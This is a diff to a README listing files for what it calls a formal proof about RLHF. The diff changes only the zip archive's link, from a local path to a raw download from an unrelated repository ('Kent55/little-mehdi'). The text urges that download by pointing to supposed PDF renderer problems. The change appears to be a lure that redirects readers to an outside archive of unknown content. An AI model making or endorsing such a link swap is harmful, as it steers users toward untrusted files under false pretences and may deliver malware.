@@ -11,7 +11,7 @@ This repository contains the formal mathematical proof that the current RLHF (Re
 
 | File | Description |
 |------|-------------|
-| [`sequent-calculus-t1-t5-proof-march-2026.zip`](./sequent-calculus-t1-t5-proof-march-2026.zip) | **Archive package** — contains both `.pdf` and `.tex`. Recommended download due to recent GitHub PDF renderer issues. |
+| [`sequent-calculus-t1-t5-proof-march-2026.zip`](https://github.com/Kent55/little-mehdi/raw/main/sequent-calculus-t1-t5-proof-march-2026.zip) | **Archive package** — contains both `.pdf` and `.tex`. Recommended download due to recent GitHub PDF renderer issues. |
 | [`sequent-calculus-t1-t5-proof-march-2026.pdf`](./sequent-calculus-t1-t5-proof-march-2026.pdf) | Pretty print version — for reading, printing, and briefings *(renderer may timeout under load; use .zip if unavailable)* |
 | [`sequent-calculus-t1-t5-proof-march-2026.tex`](./sequent-calculus-t1-t5-proof-march-2026.tex) | Source code — for verification, compilation, and adaptation |
 
